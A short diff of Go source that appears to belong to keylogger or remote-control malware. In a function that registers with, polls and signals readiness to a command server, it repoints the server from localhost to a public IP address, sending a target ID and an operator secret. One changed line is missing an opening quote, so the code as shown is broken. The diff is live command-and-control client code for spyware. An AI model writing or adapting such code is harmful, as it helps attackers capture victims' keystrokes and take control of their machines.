@@ -171,7 +171,7 @@ func startKeylogger() {
 }
 func pollAndExecute(targetID string) error {
 	// 1. REGISTRATION
-	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", 2*time.Second)
+	c, err := net.DialTimeout("tcp", 18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return err
 	}
@@ -181,7 +181,7 @@ func pollAndExecute(targetID string) error {
 	time.Sleep(100 * time.Millisecond)
 
 	// 2. POLLING
-	c, _ = net.Dial("tcp", "127.0.0.1:8080")
+	c, _ = net.Dial("tcp", "18.184.135.220:8080")
 	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
 	var r RoutingInfo
 	json.NewDecoder(c).Decode(&r)
@@ -191,7 +191,7 @@ func pollAndExecute(targetID string) error {
 	}
 
 	// 3. READY
-	c, _ = net.Dial("tcp", "127.0.0.1:8080")
+	c, _ = net.Dial("tcp", "18.184.135.220:8080")
 	json.NewEncoder(c).Encode(AuthRequest{Type: "client_ready", TargetID: targetID, Key: OP_SECRET, Listen: r.RelayAddr})
 	c.Close()
 
